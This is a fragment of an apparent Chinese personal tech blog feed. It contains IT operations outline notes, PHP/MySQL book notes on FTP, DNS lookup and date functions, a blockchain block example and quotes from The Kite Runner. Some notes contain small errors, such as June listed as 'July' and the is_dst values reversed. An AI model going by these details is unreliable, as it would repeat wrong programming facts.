start="2"><li>服务请求响应</li></ol><ul><li>1）基础设施的服务请求响应<ul><li>（1）空调系统</li><li>（2）供配电系统</li><li>（3）发电机</li><li>（4）UPS 系统</li><li>（5）消防系统</li></ul></li></ul><ul><li>2）网络设施的服务请求响应</li><li>3）硬件设施的服务请求响应</li><li>4）基础软件的服务请求响应</li></ul><ol start="3"><li>应急响应</li></ol><ul><li>1）应急准备<ul><li>（1）建立应急管理的组织和制度</li><li>（2）风险评估与改进</li><li>（3）应急事件级别划分</li><li>（4）预案制定</li><li>（5）培训与演练</li></ul></li><li>2）监测与预警<ul><li>（1）日常监测与预警</li><li>（2）记录与报告</li><li>（3）核实与评估</li><li>（4）预案启动</li></ul></li><li>3）应急处理<ul><li>（1）应急调度</li><li>（2）排查与诊断</li><li>（3）处理与恢复</li><li>（4）升级与信息通报</li><li>（5）持续服务与评价</li><li>（6）事件关闭</li></ul></li><li>4）总结改进<ul><li>（1）应急事件总结<ul><li>调查和取证</li></ul></li><li>（2）应急体系的保持<ul><li>体系维护</li><li>体系审核</li></ul></li></ul><ul><li>（3）应急准备工作的改进</li></ul></li></ul><h5 id="3-2-3-优化改善运维"><a href="#3-2-3-优化改善运维" class="headerlink" title="3.2.3 优化改善运维"></a>3.2.3 优化改善运维</h5><ol><li>适应性改进</li></ol><ul><li><p>1）基础设施的适应性改进</p><ul><li>（1）空调系统</li><li>（2）供配电系统</li><li>（3）发电机</li><li>（4）安全系统</li></ul></li><li><p>2）网络设施的适应性改进</p></li><li>3）硬件设施的适应性改进</li><li>4）基础软件的适应性改进</li></ul><ol start="2"><li>纠正性运维</li></ol><ul><li><p>1）基础设施的纠正性运维</p><ul><li>（1）空调系统</li><li>（2）供配电系统</li><li>（4）安全系统</li></ul></li></ul><ul><li>2）网络设施的适应性改进</li><li>3）硬件设施的适应性改进</li><li>4）基础软件的适应性改进</li></ul><ol start="3"><li>改善性运维</li></ol><h2 id="三、应用案例篇"><a href="#三、应用案例篇" class="headerlink" title="三、应用案例篇"></a>三、应用案例篇</h2><p>…</p><p><em>XMind: ZEN - Trial Version</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP和Mysql Web开发</title>
    <link href="http://yoursite.com/PHP/20180912-804e246c.html"/>
    <id>http://yoursite.com/PHP/20180912-804e246c.html</id>
    <published>2018-09-12T02:21:41.000Z</published>
    <updated>2021-04-08T03:18:06.357Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><a id="more"></a><h1 id="PHP-和-Mysql-Web-开发"><a href="#PHP-和-Mysql-Web-开发" class="headerlink" title="PHP 和 Mysql Web 开发"></a>PHP 和 Mysql Web 开发</h1><h2 id="第一篇-使用-PHP"><a href="#第一篇-使用-PHP" class="headerlink" title="第一篇: 使用 PHP"></a>第一篇: 使用 PHP</h2><h3 id="第-1-章-PHP-快速入门"><a href="#第-1-章-PHP-快速入门" class="headerlink" title="第 1 章: PHP 快速入门"></a>第 1 章: PHP 快速入门</h3><p>…</p><h2 id="第四篇-PHP-高级技术"><a href="#第四篇-PHP-高级技术" class="headerlink" title="第四篇: PHP 高级技术"></a>第四篇: PHP 高级技术</h2><h3 id="第-20-章"><a href="#第-20-章" class="headerlink" title="第 20 章"></a>第 20 章</h3><h4 id="20-1-了解可供使用的协议"><a href="#20-1-了解可供使用的协议" class="headerlink" title="20.1: 了解可供使用的协议"></a>20.1: 了解可供使用的协议</h4><ul><li><p>不同的计算机协议适用于不同的情况和应用程序</p><ul><li>HTTP: 超文本传输协议</li><li>FTP: 文件传输协议</li></ul></li></ul><h4 id="20-2-发送和读取电子邮件"><a href="#20-2-发送和读取电子邮件" class="headerlink" title="20.2: 发送和读取电子邮件"></a>20.2: 发送和读取电子邮件</h4><ul><li>SMTP 只能用来发送邮件</li></ul><ul><li><p>IMAP4 和 POP3 可以用来读取特定邮件服务器上的邮件，这些协议不能发送邮件</p><ul><li>IMAP4 用于读取和操作存储在服务器上的邮件</li><li>POP3 适用于将邮件下载到客户端，并从服务器上删除他们</li></ul></li></ul><h4 id="20-3-使用其他-Web-站点的数据"><a href="#20-3-使用其他-Web-站点的数据" class="headerlink" title="20.3: 使用其他 Web 站点的数据"></a>20.3: 使用其他 Web 站点的数据</h4><p>代码: <code>lookup.php</code></p><p>以下思路和<code>lookup.php</code>不太一致。</p><ol><li>获取 url，保存在\$url 中</li><li>可以通过<code>file_get_contents( $url )</code>获取 url 中网页的全部内容，可以通过 if 进行错误判断<code>if(!($contens = file_get_contents( $url )){ echo &quot;无法打开url&quot;; }</code></li><li>此时可以通过<code>echo $contents</code>，查看网页内容。</li><li>为了获取到真正有用，想要的数据，可以先对<code>$contents</code>数组，进行分割，然后就把想要的数据存在\$a 数组的某段中，可以通过 foreach 循环输出，找出需要的数据在哪个位置。如下例子:</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a  = explode(<span class="string">'div'</span>,$contents); <span class="comment">//以 div 为分割线，分割$contents,结果赋给$a 数组</span></span><br><span class="line"><span class="keyword">foreach</span> ($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br/&gt;key: "</span>.$key.<span class="string">";value: "</span>.$value.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;  <span class="comment">//此时可以通过$a[i]来访问其内容 - 5.如果$a[i] 的内容还不够纯粹，还有不需要的片段，可以继续使用explode()继续分割。</span></span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$b = explode(<span class="string">"t\"&gt;"</span>,$a[<span class="number">30</span>]);</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><h4 id="20-4-使用网络查找函数"><a href="#20-4-使用网络查找函数" class="headerlink" title="20.4. 使用网络查找函数"></a>20.4. 使用网络查找函数</h4><p>代码: directory_submit.php</p><ol><li>获取 URL，并作为 <code>parse(\$url)</code>的参数。</li></ol><p><code>parse(\$url )</code>可获取 url 中“模式”、“用户”等等信息</p><p>例子 url: <a href="http://nobody:secret@example.com:80/script.php?variable" rel="external nofollow noopener noreferrer" target="_blank">http://nobody:secret@example.com:80/script.php?variable</a> = value#anchor</p><ul><li>scheme（模式）:http</li><li>user（用户）: nobody</li><li>pass（传递）: secret</li><li>host（主机）: example.com</li><li>port（端口）: 80</li><li>path（路径）: /script.php</li><li>query（查询）: variable = value</li><li>fragment（代码段）: anchor</li></ul><ol start="2"><li>以从 url 中获取的 host 作为<code>gethostbyname($host)</code>的参数，判断是否存在可用 ip</li></ol><ul><li>作用相当于 win 的 ping</li><li>可以用<code>gethostbuaddr( )</code> 代替 <code>gethostbyname( )</code>，<code>gethostbuaddr( )</code> 以 IP 作为参数，返回主机名。</li></ul><ol start="3"><li>以@作为<code>explode( )</code>的分隔符，分割邮箱地址，获取邮箱的 host 部分。把分割出来的 host 部分作为<code>dns_get_mx($emailhost,$mxhostsarr)</code>的参数，检查 dns 服务器上是否存在可以解析的 MX 记录，有则把结果以数组的形式赋给\$mxhostsarr。可用<code>foreach( $mxhostsarr as $mx ){ echo $mx;}</code>遍历输出。</li></ol><ul><li>可以用<code>checkdnsrr( )</code>代替<code>dns_get_mx( )</code>,不过只返回 true 或 false。</li></ul><h4 id="20-5-备份或镜像一个文件"><a href="#20-5-备份或镜像一个文件" class="headerlink" title="20.5: 备份或镜像一个文件"></a>20.5: 备份或镜像一个文件</h4><h5 id="20-5-1-使用-FTP-备份或镜像一个文件"><a href="#20-5-1-使用-FTP-备份或镜像一个文件" class="headerlink" title="20.5.1: 使用 FTP 备份或镜像一个文件"></a>20.5.1: 使用 FTP 备份或镜像一个文件</h5><p>代码: ftp_mirror.php</p><ol><li>连接远程 FTP 服务器</li></ol><pre><code>+ 使用ftp_connent($host)连接ftp服务器，可以把结果存在$conn中。可以判断if(!$conn){exit;}+ $host（即将连接的FTP服务器的名称，ftp的地址）  - 以$host（即将连接的FTP服务器的名称，ftp的地址）、、$remotefile（将要下载的远程ftp服务器上的文件，包含路径和文件名）</code></pre><ol start="2"><li>登陆到 FTP 服务器</li></ol><ul><li>使用<code>ftp_login( $conn,$user,$pass )</code>登陆 ftp 服务器,把结果存放在\$result，可以判断<code>if( !$result ){ ftp_quit($conn );}</code></li></ul><pre><code>- ftp_quit($conn): 关闭ftp连接- $user（登陆的用户名）- $password（用户的密码）</code></pre><ol start="3"><li>检查文件更新时间</li></ol><pre><code>1.可以先判断本地是否已经存在了文件（用file_exists($localfile )判断），</code></pre><ul><li><p>存在则$localtime = filemtime( $localfile )获取本地文件的最近一次修改的时间； 2.不存在则把本地文件的时间修改为 0，即\$localtime = 0（赋予本地文件的初始时间为 0，对于时间戳而言，时间越接近未来，时间戳越大，时间越接近过去，则时间戳越小，此时初始时间戳为 0，则是最古老的时间，则可以保证远程文件的修改时间是最新的，由于是最新的，所以就可以覆盖本地文件。）</p><ul><li>filemtime( \$localfile ): 获取文件最近一次文件修改的时间</li><li>\$localfile（本地的文件，包含路径和文件名）</li></ul></li></ul><ul><li><p>接着获取远程文件的时间戳，例如: $remotetime = ftp_mdtm( $conn,\$remotefile )。</p></li><li><p>接着判断获取到的远程文件的时间戳是否小于 0，若小，则可能是存在某种错误或者远程文件的服务器不支持这种特性。此时可以手动把远程文件的时间戳改为本地文件的时间戳+1，这样子就能保证远程文件的时间戳比本地的时间戳要大，即表示远程文件的比本地文件新。</p></li><li><p>接着判断本地文件的时间戳和远程文件的时间戳，若本地文件比较新，则直接退出即可，因为不需要远程文件的旧版本。例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$remotetime = ftp_mdtm($conn,$remotefile);</span><br><span class="line">    <span class="keyword">if</span>(!($remotetime &gt; <span class="number">0</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can\'t access remote file time.&lt;br /&gt;"</span>;</span><br><span class="line">$remotetime = $localtime + <span class="number">1</span>;<span class="comment">//使远程文件的时间比本地文件的大，即使远程的文件比较新。</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Remote file last updated: "</span>;</span><br><span class="line"><span class="keyword">echo</span> date(<span class="string">'G:i j-M-Y'</span>,\$remotetime).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($remotetime &gt; $localtime))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Local copy is up to date.&lt;br /&gt;"</span>;</span><br><span class="line">    <span class="comment">//exit;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>下载文件</p><ul><li><p>通过文件时间戳后，若远程文件比较新，则开始下载。使用 fopen( $localhost,’w’) ，打开本地文件，给予“写”的权限，然后把结果赋给$fp，即 $fp = fopen( $localfile,’w’ );然后把远程文件通过二进制的形式写入本地文件中，可以判断该操作是否成功，以给予相应提示。例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !$success = ftp_fget( $conn,$fp,$remotefile,FTP_BINARY ))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"写入失败，即是下载失败"</span>;</span><br><span class="line">fclose( $fp );     <span class="comment">//既然失败，那可以关闭本地文件了</span></span><br><span class="line">  ftp_quit( $conn ); <span class="comment">//既然失败，那也可以关闭 ftp 连接了</span></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ftp_fget（）在 ftp 正在连接下，即$conn正常下，把$remotefile 通过二进制的方式（FTP_BINARY，如果是文本文件，可以用 ASCII 的方式，这里的例子是压缩文件包，所以用 BINARY），写入到\$fp 中，</p></li></ul></li></ul><ul><li><p>关闭 FTP 连接</p><ul><li><p>无论结果如何，程序结束了，是时候关闭一切了。例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fclose( $fp );</span><br><span class="line">ftp_quit( $conn );</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="20-5-2-上传文件"><a href="#20-5-2-上传文件" class="headerlink" title="20.5.2: 上传文件"></a>20.5.2: 上传文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ftp_put( int ftp_connetion,string remotefile_path,int fp,int model);</span><br></pre></td></tr></table></figure><h5 id="20-5-3-避免超时"><a href="#20-5-3-避免超时" class="headerlink" title="20.5.3: 避免超时"></a>20.5.3: 避免超时</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit(<span class="number">90</span>); <span class="comment">//设置最大执行时间为 90 秒</span></span><br></pre></td></tr></table></figure><h5 id="20-5-4-使用其他的-FTP-函数"><a href="#20-5-4-使用其他的-FTP-函数" class="headerlink" title="20.5.4: 使用其他的 FTP 函数"></a>20.5.4: 使用其他的 FTP 函数</h5><ul><li><p>int ftp_size( int ftp_connection,string remotefile_path );</p><ul><li>返回远程文件的字节数或者-1（出错的情况下）。该函数不是所有服务器都支持。</li><li>使用用途可以用来计算特定传输速率一次文件传输所需最大可执行时间。知道文件大小和传输连接速度，可以估算出传输需要的时间，并以此来设置 set_time_limit( )。</li></ul></li><li><p>$listing = ftp_nlist( $conn,dirname( \$remotefile ))</p><ul><li><p>dirname( \$remotefile)</p><ul><li>dirname( )可以获取文件的路径，去掉文件的名称。例如: 若$remotefile = ‘c:/testweb/home.php’;则dirname( $remotefile )返回 ‘c:/testweb’</li></ul></li><li><p>ftp_nlist( \$conn,file_dirpath )</p><ul><li>通过链接和目录路径作为参数，获取该目录下的文件名列表，结果为存放文件名的数组</li></ul></li><li><p>可以通过 foreach 循环\$listing 来输出该目录下的文件名</p><ul><li>foreach( $listing as $filename)</li></ul></li></ul></li></ul><p>echo \$filename;</p><h3 id="第-21-章-日期和时间的管理"><a href="#第-21-章-日期和时间的管理" class="headerlink" title="第 21 章: 日期和时间的管理"></a>第 21 章: 日期和时间的管理</h3><h4 id="21-1-在-PHP-中获取日期和时间"><a href="#21-1-在-PHP-中获取日期和时间" class="headerlink" title="21.1: 在 PHP 中获取日期和时间"></a>21.1: 在 PHP 中获取日期和时间</h4><h5 id="21-1-1-使用-date-函数"><a href="#21-1-1-使用-date-函数" class="headerlink" title="21.1.1: 使用 date( )函数"></a>21.1.1: 使用 date( )函数</h5><p>例如: echo date(‘ jS F Y’)</p><ul><li>j: 月份中的日期: 0~31</li><li><p>S: 序号，日期后缀，以两个字符表示，例如: ”st“、”nd“、”rd“或者”th“，取决于日期数字后面的数字是什么</p><ul><li>第 1: first</li><li>第 2: second</li><li>第 3: third</li><li>第 4: fourth</li><li>第 5: fifth</li><li>第 6: sixth</li><li>第 7: seventh</li><li>第 8: eighth</li><li>第 9: ninth</li><li>第 10: tenth</li><li>第 11: eleventh</li><li>第 12: twelfth</li><li>第 13: thirteenth</li><li>第 14: fourteenth</li><li>第 15: fifteenth</li></ul></li><li><p>F: 年中的月份，全写，从”January“到”December“</p><ul><li>一月: January</li><li>二月: February</li><li>三月: March</li><li>四月: April</li><li>五月: May</li><li>六月: July</li><li>七月: July</li><li>八月: August</li><li>九月: September</li><li>十月: October</li><li>十一月: November</li><li>十二月: December</li></ul></li></ul><h5 id="21-1-2-使用-UNIX-时间戳"><a href="#21-1-2-使用-UNIX-时间戳" class="headerlink" title="21.1.2: 使用 UNIX 时间戳"></a>21.1.2: 使用 UNIX 时间戳</h5><ul><li>32 位的整数，从 1970.1.1 到当前时刻的秒数。超过 2038 年可能有问题。</li><li><p>使用 mktime( )函数可以把时间转换位 UNIX 时间戳</p><ul><li><p>int mktime(时，分，秒，日，月，年，int is_dst)</p><ul><li>is_dst: 是否为夏令时，不是为 1，是为 0，不知道则-1，-1 则按照系统的时间来确认是否是夏令时，默认-1。值得注意的是: 该参数在 PHP 5.1.0 中被废弃。取而代之使用的是新的时区处理特性。</li></ul></li><li><p>\$timestamp 获取时间戳的三种方法</p><ol><li>\$timestamp = mktime( );</li></ol><ul><li>不带参数，则获取当前时刻的时间戳</li></ul><ol start="2"><li>\$timestamp = time( );</li></ol><ul><li>不带参数，则获取当前时刻的时间戳</li></ul><ol start="3"><li>\$timestamp = date( “U” );</li></ol><ul><li>获取当前时刻的时间戳</li></ul></li></ul></li></ul><h5 id="21-1-3-使用-getdate-函数"><a href="#21-1-3-使用-getdate-函数" class="headerlink" title="21.1.3: 使用 getdate( )函数"></a>21.1.3: 使用 getdate( )函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$today = getdate( );</span><br><span class="line">print_r( \$today );</span><br></pre></td></tr></table></figure><blockquote><p>getdate 可以把时间戳作为参数，如果把时间戳作为参数则会以数组的形式输出时间戳对应的时间信息。如果 getdate( )不带参数时把当前时间以数组形式返回。输出如下:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">[seconds] =&gt; <span class="number">44</span></span><br><span class="line">[minutes] =&gt; <span class="number">36</span></span><br><span class="line">[hours] =&gt; <span class="number">20</span></span><br><span class="line">[mday] =&gt; <span class="number">12</span></span><br><span class="line">[wday] =&gt; <span class="number">3</span></span><br><span class="line">[mon] =&gt; <span class="number">9</span></span><br><span class="line">[year] =&gt; <span class="number">2018</span></span><br><span class="line">[yday] =&gt; <span class="number">254</span></span><br><span class="line">[weekday] =&gt; Wednesday</span><br><span class="line">[month] =&gt; September</span><br><span class="line">[<span class="number">0</span>] =&gt; <span class="number">1536755804</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>0: 表示时间戳</p><h5 id="21-1-14-使用-checkdate-函数检验日期有效性"><a href="#21-1-14-使用-checkdate-函数检验日期有效性" class="headerlink" title="21.1.14: 使用 checkdate( ) 函数检验日期有效性"></a>21.1.14: 使用 checkdate( ) 函数检验日期有效性</h5><ul><li><p>可以判断闰年和平年关于 2 月 29 日的问题</p><ul><li><p>true: checkdate( 2,29,2008 );</p><ul><li><p>年份是整百数时，必须是 400 的倍数才是闰年；不是 400 的倍数的世纪年，即使是 4 的倍数也不是闰年。</p><ul><li>这就是通常所说的: 四年一闰，百年不闰，四百年再闰。 例如，2000 年是闰年，2100 年则是平年。</li></ul></li></ul></li><li><p>false: checkdate( 2,29,2007 )</p></li></ul></li></ul><h5 id="21-1-15-格式化时间戳"><a href="#21-1-15-格式化时间戳" class="headerlink" title="21.1.15: 格式化时间戳"></a>21.1.15: 格式化时间戳</h5><ul><li><p>strftime( )格式化本地系统的时间戳</p><ul><li><p>echo strftime( ‘%A’);</p><ul><li>输出 Friday</li></ul></li><li><p>echo strftime( ‘%x’);</p><ul><li>输出 09/12/18</li></ul></li><li><p>echo strftime( ‘%c’);</p><ul><li>输出 09/12/18 21:18:55</li></ul></li><li><p>echo strftime( ‘%Y’);</p><ul><li>输出 2018</li></ul></li></ul></li></ul><h4 id="21-2-在-PHP-日期格式和-MySQL-日期格式之间转换"><a href="#21-2-在-PHP-日期格式和-MySQL-日期格式之间转换" class="headerlink" title="21.2: 在 PHP 日期格式和 MySQL 日期格式之间转换"></a>21.2: 在 PHP 日期格式和 MySQL 日期格式之间转换</h4><ul><li><p>MySQL 的日期和时间是以 ISO8601 来处理的</p><ul><li>格式: YYYY-MM-DD</li></ul></li></ul><p>例如: 2018-09-12</p><pre><code>- 日期4位，月份、日期带前导0</code></pre><h4 id="21-3-在-PHP-中计算日期"><a href="#21-3-在-PHP-中计算日期" class="headerlink" title="21.3: 在 PHP 中计算日期"></a>21.3: 在 PHP 中计算日期</h4><ul><li><p>floor( time( )/(365<em>24</em>60*60) ）= 48</p><ul><li><p>当前时间戳/365<em>24</em>60*60 = 1970 距离今年的时间</p><ul><li>365<em>24</em>60*60 = 365 天的秒数</li></ul></li></ul></li><li><p>可以用两个时间点的时间戳相减来获取两点时间的距离，再除以一年的秒数既可获取具体的年份距离。</p></li></ul><h4 id="21-4-在-MySQL-中计算日期"><a href="#21-4-在-MySQL-中计算日期" class="headerlink" title="21.4: 在 MySQL 中计算日期"></a>21.4: 在 MySQL 中计算日期</h4><ul><li><p>可以使用 datadiff( )、date_add( )、date_sub( )、date_diff( )函数</p><ul><li>例如:</li></ul></li></ul><p>mysqli_query(\$db,”select datediff( now(),’bdayISO’ )”)</p><ul><li>now( )可以获取当前时间的时间戳</li><li>bdayISO 则是自定义的某时间的时间戳</li><li>data_datadiff( )把两个参数相减</li></ul><h4 id="21-5-使用微秒"><a href="#21-5-使用微秒" class="headerlink" title="21.5: 使用微秒"></a>21.5: 使用微秒</h4><ul><li><p>microtime( )可以获取微秒</p><ul><li><p>返回类似这样子的数字: 0.50451000 1536759631</p><ul><li>前者应该是当前时间的微秒，后者是 1970 年以来的所有秒数，不是微秒。</li></ul></li></ul></li></ul><h4 id="21-6-使用日历函数"><a href="#21-6-使用日历函数" class="headerlink" title="21.6: 使用日历函数"></a>21.6: 使用日历函数</h4><p><em>XMind: ZEN - Trial Version</em></p><p>— <em>待更新：2018-09-12</em> —</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP区块链</title>
    <link href="http://yoursite.com/PHP/20180904-fd0fbaae.html"/>
    <id>http://yoursite.com/PHP/20180904-fd0fbaae.html</id>
    <published>2018-09-04T02:26:41.000Z</published>
    <updated>2021-04-08T03:18:06.356Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><a id="more"></a><h1 id="PHP-区块链"><a href="#PHP-区块链" class="headerlink" title="PHP 区块链"></a>PHP 区块链</h1><p>一个区块的结构:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">block = &#123;</span><br><span class="line">  index: <span class="number">1</span>,</span><br><span class="line">  timestamp: <span class="number">1506057125.900785</span>,</span><br><span class="line">  transactions: [</span><br><span class="line">    &#123;</span><br><span class="line">      sender: <span class="string">"8527147fe1f5426f9dd545de4b27ee00"</span>,</span><br><span class="line">      recipient: <span class="string">"a77f5cdfa2934df3954a5c7c7da5df1f"</span>,</span><br><span class="line">      amount: <span class="number">5</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  proof: <span class="number">324984774000</span>,</span><br><span class="line">  previous_hash:</span><br><span class="line">    <span class="string">"2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>这里面每个区块包含属性：索引（index），Unix 时间戳（timestamp），交易列表（transactions），工作量证明以及前一个区块的 Hash 值。每个新的区块都包含上一个区块的 Hash，这是关键的一点，它保障了区块链不可变性。如果攻击者破坏了前面的某个区块，那么后面所有区块的 Hash 都会变得不正确。</p></blockquote><h2 id="区块属性"><a href="#区块属性" class="headerlink" title="区块属性"></a>区块属性</h2><ul><li>索引（index）</li><li>Unix 时间戳（timestamp）</li><li>交易列表（transactions）</li><li>工作量证明</li><li>前一个区块的 Hash 值。</li></ul><p><em>XMind: ZEN - Trial Version</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>《追风筝的人》摘录</title>
    <link href="http://yoursite.com/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/20180223-36d09ed4.html"/>
    <id>http://yoursite.com/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/20180223-36d09ed4.html</id>
    <published>2018-02-23T11:51:14.000Z</published>
    <updated>2021-04-08T03:18:06.376Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><a id="more"></a><h2 id="追风筝的人"><a href="#追风筝的人" class="headerlink" title="追风筝的人"></a>追风筝的人</h2><ol><li>为你，千千万万遍。–001</li><li>那里有再次成为好人的路–002</li><li>罪行只有一种，只有一种，那就是盗窃，其他罪行都是盗窃的变种。–017</li><li>没有比盗窃更十恶不赦的事情了.–018</li><li>如果说有什么真主，我希望他有其它重要的事情做，而不是来关注我喝烈酒。–019</li><li>一个不能保护自己的男孩，长大之后什么东西都保护不了。–023</li><li>历史不好轻易改变，宗教也是。–025</li><li>我的大门永远为你开着。<br>我愿意倾听你诉说的任何故事。–032</li><li>实际上，为什么他必须感动悲伤才能掉眼泪呢？他不可以只是闻闻洋葱吗？–034</li><li>我知道要是医生跟你说不会痛的时候，你的麻烦就大了。–046</li><li>如果追风筝的人手里拿着风筝，没有人能将它拿走。–051<br>（65错别字？我业，业已经）</li><li>为你，千千万万遍！–066/–070</li><li>你有没有想过请新的佣人–088</li><li>要是我拿这个（石榴）打你，你会怎么做啊？</li><li>如果没有请来全世界的人，就不算是个宴会–092</li><li>（阿塞夫）他带着他们走过来，好像拎着他们过来一样，似乎他才是父亲，他们是孩子。–093</li><li>他的眼睛出卖了他。我看着他的眼睛，看穿了他虚有其表，有一种疯狂隐藏在他身内。–095</li><li>我们会有一个盛大的、梦幻般的婚礼，从坎大哈和喀布尔请亲朋好友来参加。我会给我们盖一座大房子，白色的，露台铺着瓷砖，窗户很大。我们会在花园里种果树，还有各种各样的花儿，有一个草坪，我们的孩子在上面玩耍。–097</li><li>哈桑端着银盘，服侍着阿塞夫和瓦里喝酒。–098</li><li>我们有一个必须离开。–100</li><li>那天夜里之前，我问爸爸有没有看到我的新手表。–101</li><li><p>战争不会使高尚的情操消失，人们甚至比和平时期更需要它。–112</p></li><li><p>这是哈桑最后一次为我牺牲。–103</p></li><li>我只知道记忆与我同在，将美好的往事完美地浓缩起来，如同一笔浓墨重彩，涂抹在我们那已经变得灰白单调的生活画布上。–119</li><li>对我来说，美国是个埋葬往事的地方。对爸爸来说，这是个哀悼过去的地方。–125</li><li>这也许不公平，但几天内发生的事情，有时甚至是一天内发生的事情，也足以改变一生。–137</li><li>雅尔达是星光黯淡的夜晚，恋人彻夜难眠，忍受着无边的黑暗，等待太阳升起，带来他们的爱人。–138</li><li>好书总是跟悲伤的故事有关。–142</li><li>我很高兴你来了。这对我……意味着一切。–156</li><li>如果那会让你觉得好一些，你就告诉我吧。但是它不会改变任何事情。–159</li><li>“今晚不用了”，他说，“今晚不痛”。–168</li><li>也许在某个地方，有某个人，因为某件事决定剥夺我唯一人夫的权利，以报复我曾经的所作所为，也许这是我的报应，也许这样是罪有应得。也许事情不是这样的。雅米兰阿姨说，或者，也许事情注定是这样的。–183</li><li>来吧，这儿有再次成为好人的路。–186</li><li>为你，千千万万遍。–187</li><li>房间里的大象。–191</li><li>我们总陷入在悲伤和自恋中。我们在失败和灾难面前屈服，将这些当成生活的实纸，甚